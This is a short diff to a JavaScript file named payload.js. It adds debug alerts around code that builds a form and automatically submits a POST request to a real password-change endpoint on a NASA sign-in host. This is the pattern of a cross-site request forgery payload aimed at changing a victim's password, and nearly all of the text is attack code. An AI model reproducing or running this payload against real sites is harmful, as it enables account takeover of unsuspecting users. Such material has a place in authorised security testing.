@@ -1,3 +1,5 @@
+alert('payload.js loaded successfully');
+
 var f=document.createElement('form');
 f.method='POST';
 f.action='https://cce-signin.gsfc.nasa.gov/cgi-bin/openid_sign_in/change_pw.pl';
@@ -18,4 +20,6 @@ for(var k in fields){
   f.appendChild(i);
 }
 document.body.appendChild(f);
+alert('form built, about to submit');
 f.submit();
+alert('form submitted');
